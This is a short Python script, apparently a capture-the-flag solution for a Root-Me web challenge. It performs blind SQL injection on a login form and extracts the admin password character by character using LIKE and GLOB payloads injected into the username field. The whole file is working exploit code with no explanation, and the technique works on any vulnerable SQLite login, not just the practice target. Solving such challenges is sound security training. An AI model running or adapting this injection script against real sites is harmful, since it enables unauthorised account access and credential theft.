import requests

url = "http://challenge01.root-me.org/web-serveur/ch10/"

str1= "admin' and password like '"
str3="%'--"
str2=''	
password=''
strChar=''
strCharGlob=''
while (1):
	stringUsernameRequest="admin' and password glob '"+strCharGlob+"[a-z]*'--"
	http = requests.post(url,data={'username':stringUsernameRequest,'password':'a'})
	content=http.text
	if "Welcome back admin" in content:
		for i in range(ord('a'), ord('z')+1):
			str2=strChar+chr(i)
			stringUsernameRequest= str1 + str2+ str3	
			http = requests.post(url,data={'username':stringUsernameRequest,'password':'a'})
			content=http.text
			if "Welcome back admin" in content:
				password=password+chr(i)
				strChar=strChar+'_'
				strCharGlob=strCharGlob+'?'
				print(chr(i))
				break
			
	else:
		stringUsernameRequest="admin' and password glob '"+strCharGlob+"[A-Z]*'--"
		http = requests.post(url,data={'username':stringUsernameRequest,'password':'a'})
		content=http.text
		if "Welcome back admin" in content:
			for i in range(ord('A'), ord('Z')+1):
				str2=strChar+chr(i)
				stringUsernameRequest= str1 + str2+ str3
				http = requests.post(url,data={'username':stringUsernameRequest,'password':'a'})
				content=http.text
				if "Welcome back admin" in content:
					password=password+chr(i)
					strChar=strChar+'_'
					strCharGlob=strCharGlob+'?'
					print(chr(i))
					break
				
		else:
			stringUsernameRequest="admin' and password glob '"+strCharGlob+"[0-9]*'--"
			http = requests.post(url,data={'username':stringUsernameRequest,'password':'a'})
			content=http.text
			if "Welcome back admin" in content:
				for i in range(ord('0'), ord('9')+1):
					str2=strChar+chr(i)
					stringUsernameRequest= str1 + str2+ str3	
					http = requests.post(url,data={'username':stringUsernameRequest,'password':'a'})
					content=http.text
					if "Welcome back admin" in content:
						password=password+chr(i)
						strChar=strChar+'_'
						strCharGlob=strCharGlob+'?'
						print(chr(i))
						break
					
					
			else:
				break
				
				
print(password)
